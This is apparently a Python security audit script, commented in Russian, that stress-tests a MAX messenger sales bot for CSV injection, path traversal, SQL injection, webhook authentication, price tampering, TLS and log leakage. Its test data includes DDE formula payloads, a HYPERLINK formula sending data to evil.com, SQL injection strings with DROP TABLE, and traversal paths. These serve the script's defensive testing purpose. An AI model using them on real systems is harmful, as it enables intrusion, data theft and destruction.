# -*- coding: utf-8 -*-
# ==============================================================================
# Модуль: audit_stress_test.py
# Назначение: Комплексный стресс-тест безопасности, отказоустойчивости и аудита
# Автор: V1PER (viper86rus-arch)
# Лицензия: MIT License (2026)
# ==============================================================================

import os
import sys
import time
import json
import sqlite3
import tempfile
import threading
import traceback
from pathlib import Path

# Гарантируем импорт модулей проекта
PROJECT_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(PROJECT_ROOT))

from config import (
    ADMIN_MAX_ID, DATABASE_PATH, EXPORTS_DIR, PROPOSALS_DIR, logger
)
from storage import (
    init_db, get_user_state, set_user_state, clear_user_state,
    save_lead, export_leads_to_csv, get_admin_stats, get_recent_leads
)
from max_api import MaxApiClient
from pdf_generator import generate_proposal_pdf, clean_text_for_pdf
from bot import BotEngine, MaxWebhookHandler

# Цветовая индикация результатов
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"
BOLD = "\033[1m"

class SecurityAuditRunner:
    """Движок глубокого ревизионного аудита и стресс-тестирования."""

    def __init__(self):
        self.findings = []
        self.temp_dir = tempfile.TemporaryDirectory()
        self.test_db = os.path.join(self.temp_dir.name, "audit_test.db")
        init_db(self.test_db)
        self.api = MaxApiClient(token="mock_audit_token")
        self.engine = BotEngine(self.api, self.test_db)

    def log_finding(self, severity: str, title: str, description: str, cwe: str = ""):
        self.findings.append({
            "severity": severity,
            "title": title,
            "description": description,
            "cwe": cwe
        })
        color = RED if severity in ("CRITICAL", "HIGH") else (YELLOW if severity == "MEDIUM" else GREEN)
        print(f"  {color}[{severity}]{RESET} {title} {f'({cwe})' if cwe else ''}")
        print(f"      └─ {description}")

    # ==============================================================================
    # 1. ТЕСТИРОВАНИЕ CSV / FORMULA INJECTION (CWE-1236)
    # ==============================================================================
    def test_csv_injection(self):
        print(f"\n{BOLD}{BLUE}[1/8] Тестирование CSV Injection / Formula Injection (CWE-1236)...{RESET}")
        
        payloads = [
            ("=cmd|' /C calc'!A0", "DDE Execution Calc"),
            ("@SUM(1+1)*cmd|' /C notepad'!A0", "At-Prefix Calc"),
            ("+1000+2000", "Plus Prefix Formula"),
            ("-2+3*4", "Minus Prefix Formula"),
            ("\t=1+1", "Tab-Prefixed Formula"),
            ("\r=1+1", "CR-Prefixed Formula"),
            ("=HYPERLINK(\"http://evil.com?leak=\"&A2, \"Click\")", "Hyperlink Exfiltration")
        ]

        # Записываем каждую полезную нагрузку в различные поля базы
        for p_val, label in payloads:
            lead_id = save_lead(
                max_user_id=f"attacker_{label}",
                user_name=p_val,
                phone=p_val,
                service_type=p_val,
                platforms="MAX",
                budget_range=p_val,
                description=p_val,
                db_path=self.test_db
            )

        # Выполняем экспорт
        csv_file = export_leads_to_csv(self.test_db)
        
        # Анализируем полученный файл
        with open(csv_file, "r", encoding="utf-8-sig") as f:
            lines = f.readlines()

        formula_chars = ("=", "+", "-", "@", "\t", "\r")
        unescaped_vulnerabilities = []

        # Пропускаем строку заголовков
        for line_num, line in enumerate(lines[1:], start=2):
            cells = line.strip().split(";")
            for c_idx, cell in enumerate(cells):
                for char in formula_chars:
                    if cell.startswith(char):
                        unescaped_vulnerabilities.append((line_num, c_idx, cell))

        if unescaped_vulnerabilities:
            sample = unescaped_vulnerabilities[0][2]
            self.log_finding(
                "CRITICAL",
                "CSV Injection / Formula Injection в export_leads_to_csv()",
                f"Обнаружено {len(unescaped_vulnerabilities)} несанитизированных ячеек. Строки с '=', '+', '-', '@' "
                f"записываются сырыми без экранирующего апострофа `'`. Пример: '{sample}'. "
                f"При открытии файла в Excel/Calc возможен запуск произвольного кода (DDE) и утечка данных.",
                "CWE-1236"
            )
        else:
            print(f"  {GREEN}[PASS]{RESET} CSV формула-инъекции экранируются апострофом.")

    # ==============================================================================
    # 2. ТЕСТИРОВАНИЕ PATH TRAVERSAL И OVERWRITE (CWE-22)
    # ==============================================================================
    def test_path_traversal_and_file_safety(self):
        print(f"\n{BOLD}{BLUE}[2/8] Тестирование Path Traversal, File Overwrite и Memory DoS (CWE-22, CWE-400)...{RESET}")

        test_out_dir = Path(self.temp_dir.name) / "proposals_audit"
        test_out_dir.mkdir(parents=True, exist_ok=True)

        # 1. Проверка передачи некорректного или Path Traversal order_id
        traversal_payloads = [
            "../../escaped",
            "../system_pwn",
            "nested/../../overwrite"
        ]

        for payload in traversal_payloads:
            try:
                pdf_path = generate_proposal_pdf(
                    order_id=payload,  # type: ignore
                    client_name="Test Company",
                    project_type="Bot",
                    db_title="SQLite",
                    extra_title="None",
                    total_price=1000,
                    total_days=1,
                    output_dir=test_out_dir
                )
                resolved = Path(pdf_path).resolve()
                if not str(resolved).startswith(str(test_out_dir.resolve())):
                    self.log_finding(
                        "HIGH",
                        "Path Traversal выход за пределы папки proposals/",
                        f"order_id='{payload}' привел к генерации файла по пути {resolved}, "
                        f"находящемуся вне целевой директории {test_out_dir}.",
                        "CWE-22"
                    )
            except Exception as e:
                # Ошибки файловой системы ожидаемы при отсутствии директорий
                pass

        # 2. Проверка строгой типизации order_id
        try:
            # Передаем отрицательный или нулевой ID
            pdf_path_zero = generate_proposal_pdf(
                order_id=-999,
                client_name="Test",
                project_type="Bot",
                db_title="None",
                extra_title="None",
                total_price=1000,
                total_days=1,
                output_dir=test_out_dir
            )
            if Path(pdf_path_zero).exists():
                self.log_finding(
                    "MEDIUM",
                    "Отсутствие валидации неотрицательного числового order_id в generate_proposal_pdf()",
                    "Функция принимает отрицательные и произвольные ID (создан proposal_-999.pdf). "
                    "Рекомендуется строгая проверка: order_id > 0 и isinstance(order_id, int).",
                    "CWE-1284"
                )
        except Exception:
            pass

        # 3. DoS стресс-тест: передача сверхдлинного текста (150 000 символов)
        print("  ...выполнение DoS стресс-теста генерации PDF (150 000 символов)")
        huge_text = "V1PER_SECURITY_STRESS_" * 7000  # ~154k символов
        t0 = time.time()
        try:
            huge_pdf = generate_proposal_pdf(
                order_id=777888,
                client_name=huge_text,
                project_type="Enterprise Audit Bot",
                db_title="PostgreSQL Cluster",
                extra_title="Full Suite",
                total_price=50000,
                total_days=5,
                output_dir=test_out_dir
            )
            elapsed = time.time() - t0
            file_size = os.path.getsize(huge_pdf)
            
            # Оцениваем раздувание размера и отсутствие переноса текста
            if file_size > 4 * 1024 * 1024:
                self.log_finding(
                    "MEDIUM",
                    "DoS по размеру PDF-файла и отсутствие ограничения длины полей (CWE-400)",
                    f"Генерация PDF со строкой 150k символов заняла {elapsed:.2f}с, но размер одного файла "
                    f"раздулся до {file_size / (1024*1024):.2f} МБ. В PDF-операторах текст не усекается "
                    f"и рендерится в одну гигантскую строку за пределами полотна A4. "
                    f"Рекомендуется санитизация длины строк (max 200-500 символов).",
                    "CWE-400"
                )
        except Exception as e:
            self.log_finding("HIGH", "Отказ в обслуживании (DoS) при генерации PDF", str(e), "CWE-400")

    # ==============================================================================
    # 3. БЕЗОПАСНОСТЬ SQLITE, WAL И КОНКУРЕНТНЫЕ ГОНКИ (Race Conditions)
    # ==============================================================================
    def test_sqlite_security_and_concurrency(self):
        print(f"\n{BOLD}{BLUE}[3/8] Тестирование безопасности SQLite, WAL и Race Conditions...{RESET}")

        # 1. Проверка SQL Injection (CWE-89)
        sqli_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE commercial_leads; --",
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
            "' AND 1=0 UNION ALL SELECT 1,'admin','pass',4,5,6,7,8,9,10 --"
        ]

        sqli_passed = True
        for p in sqli_payloads:
            try:
                # Тестируем get_user_state
                step, data = get_user_state(p, db_path=self.test_db)
                # Тестируем save_lead
                save_lead(p, p, p, p, p, p, p, db_path=self.test_db)
                # Тестируем get_recent_leads
                get_recent_leads(5, db_path=self.test_db)
            except Exception as e:
                self.log_finding("CRITICAL", "SQL Injection уязвимость в SQLite", f"Payload: {p}, Error: {e}", "CWE-89")
                sqli_passed = False
                break

        if sqli_passed:
            print(f"  {GREEN}[PASS]{RESET} Все SQL-запросы параметризованы через кортежи (?). SQLi не выявлена.")

        # 2. Проверка WAL режима и таймаутов блокировки
        with sqlite3.connect(self.test_db) as conn:
            cursor = conn.cursor()
            cursor.execute("PRAGMA journal_mode")
            mode = cursor.fetchone()[0].lower()
            cursor.execute("PRAGMA busy_timeout")
            busy_to = cursor.fetchone()[0]

        if mode != "wal":
            self.log_finding(
                "MEDIUM",
                "Отсутствует режим WAL (Write-Ahead Logging) в SQLite (CWE-662)",
                f"Текущий режим журнала: '{mode.upper()}'. При конкурентных вебхуках или параллельном экспорте "
                f"писатели блокируют читателей и вызывают 'sqlite3.OperationalError: database is locked'. "
                f"Необходимо вызывать 'PRAGMA journal_mode = WAL;' при инициализации.",
                "CWE-662"
            )

        if busy_to < 3000:
            self.log_finding(
                "MEDIUM",
                "Не настроен PRAGMA busy_timeout в SQLite",
                f"Текущий таймаут блокировки: {busy_to} мс. При пиковых нагрузках вебхуков запросы "
                f"будут падать с ошибкой блокировки без ожидания освобождения ресурса. Рекомендуется >= 5000 мс.",
                "CWE-662"
            )

        # 3. Стресс-тест конкурентной записи (Race Condition)
        print("  ...запуск стресс-теста 30 параллельных потоков на запись в SQLite")
        threads = []
        concurrency_errors = []

        def worker(idx):
            try:
                uid = f"thread_usr_{idx}"
                set_user_state(uid, "ask_budget", {"service": f"Service_{idx}"}, db_path=self.test_db)
                save_lead(uid, f"Name_{idx}", "+79991112233", "Bot", "MAX", "10000", "Desc", db_path=self.test_db)
                get_user_state(uid, db_path=self.test_db)
            except Exception as exc:
                concurrency_errors.append(exc)

        for i in range(30):
            t = threading.Thread(target=worker, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        if concurrency_errors:
            self.log_finding(
                "HIGH",
                "Сбои при параллельной работе с SQLite (Database Locked)",
                f"Зафиксировано {len(concurrency_errors)} ошибок блокировки базы при 30 потоках. "
                f"Причина: отсутствие WAL-режима и короткий busy_timeout. Пример: {concurrency_errors[0]}",
                "CWE-662"
            )
        else:
            print(f"  {GREEN}[PASS]{RESET} 30 параллельных транзакций завершены без сбоев.")

    # ==============================================================================
    # 4. ВАЛИДАЦИЯ ВЕБХУКОВ И БИЗНЕС-ЛОГИКА (CWE-306, CWE-472)
    # ==============================================================================
    def test_webhook_and_business_logic(self):
        print(f"\n{BOLD}{BLUE}[4/8] Аудит вебхуков, бизнес-логики и авторизации...{RESET}")

        # 1. Ценовая манипуляция через Callback (Price Tampering / Business Logic Flaw)
        # Пользователь присылает подделанный callback со стоимостью 1 рубль
        tampered_callback = "calc_ord:miniapp:yes:all:1:1"
        hacker_id = "hacker_client_666"
        hacker_name = "Price Manipulator"

        reply = self.engine.process_incoming(hacker_id, tampered_callback, hacker_name)
        # Пользователь подтверждает контакт
        final_reply = self.engine.process_incoming(hacker_id, "+79990000000", hacker_name)

        # Проверяем, какая смета была записана в базу
        with sqlite3.connect(self.test_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT budget_range, service_type FROM commercial_leads WHERE max_user_id = ?", (hacker_id,))
            row = cursor.fetchone()

        if row and "1 ₽" in row[0]:
            self.log_finding(
                "HIGH",
                "Price Tampering: Клиентская подмена стоимости заказа в calc_ord (CWE-472)",
                "Бот слепо доверяет переданным в callback частям parts[4] (цена) и parts[5] (срок), "
                "не проверяя их соответствие серверной конфигурации CALCULATOR_CONFIG. "
                "Злоумышленник оформил заказ на MiniApp (15 000+ ₽) со сметой 1 ₽ и сгенерировал юридически "
                "значимый PDF договор-оферту с ЭЦП на 1 ₽!",
                "CWE-472"
            )
        else:
            print(f"  {GREEN}[PASS]{RESET} Стоимость заказа перепроверяется на сервере.")

        # 2. Незащищенный эндпоинт экспорта данных GET /export в MaxWebhookHandler
        import inspect
        do_get_src = inspect.getsource(MaxWebhookHandler.do_GET)
        if "/export" in do_get_src:
            self.log_finding(
                "HIGH",
                "Неавторизованный экспорт персональных данных GET /export (CWE-306 / CWE-200)",
                "Эндпоинт GET /export в MaxWebhookHandler доступен любому внешнему HTTP-клиенту без "
                "авторизации, токена или проверки IP. Злоумышленник может массово вызывать экспорт, "
                "создавая DoS файловой системы и получая пути к базам лидов.",
                "CWE-306"
            )
        else:
            print(f"  {GREEN}[PASS]{RESET} Публичный эндпоинт GET /export отключен (доступ только через закрытую админку).")

        # 3. Валидация подписи / секрета вебхука POST /webhook
        do_post_src = inspect.getsource(MaxWebhookHandler.do_POST)
        if "webhook_secret" in do_post_src or "X-Max-Bot-Secret" in do_post_src:
            print(f"  {GREEN}[PASS]{RESET} Валидация подписи/секретного токена вебхука реализована.")
        else:
            self.log_finding(
                "HIGH",
                "Отсутствие верификации подписи вебхука в POST /webhook (CWE-306, CWE-290)",
                "Обработчик do_POST принимает любые входящие POST-запросы без проверки HMAC-подписи МАКС, "
                "секретного токена вебхука или белого списка IP-адресов. Любой пользователь сети Интернет "
                "может отправить запрос от лица любого user_id (включая ADMIN_MAX_ID) и фальсифицировать данные.",
                "CWE-306"
            )

        # 4. Проверка устойчивости к битым колбэкам (IndexError)
        malformed_callbacks = [
            "calc_ord:bot",
            "calc_s2:",
            "calc_s3:bot",
            "calc_res:bot:yes"
        ]
        crashes = []
        for m_cb in malformed_callbacks:
            try:
                self.engine.process_incoming("test_crash_usr", m_cb, "Crash Tester")
            except IndexError as ie:
                crashes.append((m_cb, str(ie)))
            except Exception:
                pass

        if crashes:
            self.log_finding(
                "MEDIUM",
                "Необработанный IndexError при парсинге усеченных callback payload (CWE-754)",
                f"Передача битых callback строк ({crashes[0][0]}) вызывает неперехваченный IndexError: {crashes[0][1]}. "
                f"Необходимо валидировать количество сегментов (len(parts)) перед обращением по индексам.",
                "CWE-754"
            )
        else:
            print(f"  {GREEN}[PASS]{RESET} Битые callback-строки обрабатываются без аварийных падений.")

    # ==============================================================================
    # 5. БЕЗОПАСНОСТЬ SSL/TLS И СЕТЕВОГО КЛИЕНТА (CWE-295)
    # ==============================================================================
    def test_ssl_tls_security(self):
        print(f"\n{BOLD}{BLUE}[5/8] Аудит безопасности SSL/TLS и сертификатов (CWE-295)...{RESET}")

        # 1. Проверка отключения валидации сертификатов в MaxApiClient
        import ssl
        from max_api import MaxApiClient
        import inspect

        # Тестируем инициализацию при отсутствии CA файла
        dummy_client = MaxApiClient(token="mock", base_url="https://platform-api2.max.ru")
        
        # Проверяем загрузку файлов на CDN oneme.ru в max_api.py
        upload_src = inspect.getsource(MaxApiClient.upload_file)
        if "CERT_NONE" in upload_src or "check_hostname = False" in upload_src:
            self.log_finding(
                "CRITICAL",
                "Полное отключение проверки SSL-сертификатов (CERT_NONE) при CDN upload (CWE-295)",
                "В методе upload_file() контекст cdn_ssl_ctx инициализируется с check_hostname = False и "
                "verify_mode = ssl.CERT_NONE. Это открывает возможность Man-in-the-Middle (MITM) атаки "
                "с перехватом токенов доступа, конфиденциальных коммерческих предложений и персональных данных клиентов.",
                "CWE-295"
            )
        else:
            print(f"  {GREEN}[PASS]{RESET} SSL-сертификаты CDN проверяются в строгом режиме (CERT_REQUIRED).")

        # Проверка фоллбэка при отсутствии russian_trusted_root_ca.pem
        ca_path = PROJECT_ROOT / "russian_trusted_root_ca.pem"
        if ca_path.exists():
            print(f"  {GREEN}[PASS]{RESET} Корневой сертификат Минцифры присутствует: {ca_path.name}")
        else:
            self.log_finding(
                "HIGH",
                "Отсутствует корневой сертификат Минцифры russian_trusted_root_ca.pem",
                "При отсутствии файла бот переключается в режим CERT_NONE, отключая проверку подлинности API МАКС.",
                "CWE-295"
            )

    # ==============================================================================
    # 6. УТЕЧКИ ТОКЕНОВ И СЕКРЕТОВ В ЛОГАХ
    # ==============================================================================
    def test_secret_leakage(self):
        print(f"\n{BOLD}{BLUE}[6/8] Аудит утечек токенов и секретов в логах...{RESET}")

        # Проверяем вывод токена в консоль при ошибках или _request
        leaks = []
        production_files = ["bot.py", "max_api.py", "pdf_generator.py", "storage.py", "config.py"]
        for fname in production_files:
            py_file = PROJECT_ROOT / fname
            if py_file.exists():
                with open(py_file, "r", encoding="utf-8") as f:
                    content = f.read()
                    if "print(MAX_BOT_TOKEN" in content or "logger.info(self.token" in content:
                        leaks.append(fname)

        if leaks:
            self.log_finding("HIGH", "Прямой вывод токенов авторизации в логи", f"Файлы: {leaks}", "CWE-532")
        else:
            print(f"  {GREEN}[PASS]{RESET} Прямого вывода токенов в логи не обнаружено.")

        # Проверка PII в логах
        with open(PROJECT_ROOT / "bot.py", "r", encoding="utf-8") as f:
            bot_code = f.read()

        if "mask_pii" in bot_code:
            print(f"  {GREEN}[PASS]{RESET} Персональные данные (телефоны) маскируются при логировании.")
        else:
            self.log_finding(
                "LOW",
                "Логирование персональных данных (PII) в открытом виде (CWE-532)",
                "В bot.py входящие сообщения и контакты пользователей логируются без маскирования: "
                "logger.info(f'[ВХОДЯЩЕЕ СООБЩЕНИЕ] от {user_name} ({user_id}): {text}'). "
                "Номера телефонов и персональные контакты попадают в stdout без хеширования.",
                "CWE-532"
            )

    # ==============================================================================
    # 7. ЦЕЛОСТНОСТЬ АННОТАЦИЙ ТИПОВ И СИНТАКСИСА
    # ==============================================================================
    def test_type_annotations_and_syntax(self):
        print(f"\n{BOLD}{BLUE}[7/8] Проверка рантайм-целостности аннотаций типов...{RESET}")

        import pdf_generator
        try:
            # В Python при интроспекции __annotations__ вычисляются типы
            ann = getattr(pdf_generator.clean_text_for_pdf, "__annotations__", {})
            print(f"  {GREEN}[PASS]{RESET} Аннотации clean_text_for_pdf корректны.")
        except NameError as ne:
            self.log_finding(
                "MEDIUM",
                "NameError при интроспекции типов: 'Any' не импортирован в pdf_generator.py (CWE-754)",
                f"В строке 49 def clean_text_for_pdf(text: Any) -> str: используется 'Any', но он не импортирован "
                f"из typing (в строке 15 импортирован только Optional). Интроспекция типов падает с: {ne}",
                "CWE-754"
            )

    # ==============================================================================
    # 8. GRACEFUL EXIT И OFFLINE РЕЖИМ (Zero-Pip)
    # ==============================================================================
    def test_graceful_exit_and_offline(self):
        print(f"\n{BOLD}{BLUE}[8/8] Проверка Graceful Exit (код 130) и автономного режима...{RESET}")

        # Проверяем обработчик SIGINT в bot.py
        with open(PROJECT_ROOT / "bot.py", "r", encoding="utf-8") as f:
            bot_code = f.read()

        if "sys.exit(130)" in bot_code and "signal.signal(signal.SIGINT" in bot_code:
            print(f"  {GREEN}[PASS]{RESET} Обработчик SIGINT зарегистрирован и завершает процесс с кодом 130.")
        else:
            self.log_finding(
                "MEDIUM",
                "Некорректная обработка сигналов завершения процесса",
                "Отсутствует явный выход с кодом 130 при получении SIGINT.",
                "CWE-755"
            )

        # Проверка отсутствия внешних pip зависимостей
        pip_dependencies = []
        import_blacklist = ["requests", "aiohttp", "fastapi", "reportlab", "pydantic", "telebot", "aiogram"]
        for py_file in PROJECT_ROOT.glob("*.py"):
            with open(py_file, "r", encoding="utf-8") as f:
                content = f.read()
                for mod in import_blacklist:
                    if f"import {mod}" in content or f"from {mod}" in content:
                        pip_dependencies.append((py_file.name, mod))

        if pip_dependencies:
            self.log_finding(
                "HIGH",
                "Нарушение принципа Zero-Pip: обнаружены сторонние библиотеки",
                f"Зависимости: {pip_dependencies}",
                "ARCH-01"
            )
        else:
            print(f"  {GREEN}[PASS]{RESET} Архитектура Zero-Pip соблюдена на 100%: только Python Standard Library.")

    # ==============================================================================
    # ИТОГОВЫЙ СТАТИСТИЧЕСКИЙ ОТЧЕТ
    # ==============================================================================
    def run_all(self):
        print("=" * 80)
        print(f"{BOLD}🛡️ СТУДИЯ V1PER IT SOLUTIONS: БЕСПОЩАДНЫЙ АУДИТ И СТРЕСС-ТЕСТ MAX_Commercial_Bot{RESET}")
        print("=" * 80)

        t_start = time.time()
        self.test_csv_injection()
        self.test_path_traversal_and_file_safety()
        self.test_sqlite_security_and_concurrency()
        self.test_webhook_and_business_logic()
        self.test_ssl_tls_security()
        self.test_secret_leakage()
        self.test_type_annotations_and_syntax()
        self.test_graceful_exit_and_offline()
        t_total = time.time() - t_start

        self.temp_dir.cleanup()

        # Подсчет итогов
        crit_count = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        high_count = sum(1 for f in self.findings if f["severity"] == "HIGH")
        med_count = sum(1 for f in self.findings if f["severity"] == "MEDIUM")
        low_count = sum(1 for f in self.findings if f["severity"] == "LOW")

        print("\n" + "=" * 80)
        print(f"{BOLD}ИТОГИ АУДИТА БЕЗОПАСНОСТИ ({t_total:.2f} сек):{RESET}")
        print(f"  🔴 Критических уязвимостей (CRITICAL): {crit_count}")
        print(f"  🟠 Высоких рисков (HIGH):              {high_count}")
        print(f"  🟡 Архитектурных дефектов (MEDIUM):    {med_count}")
        print(f"  🟢 Низких замечаний (LOW):             {low_count}")
        print("=" * 80)

        return crit_count, high_count, med_count, low_count

if __name__ == "__main__":
    runner = SecurityAuditRunner()
    crit, high, med, low = runner.run_all()
    # Возвращаем ненулевой код при наличии критических проблем
    if crit > 0 or high > 0:
        sys.exit(1)
    sys.exit(0)
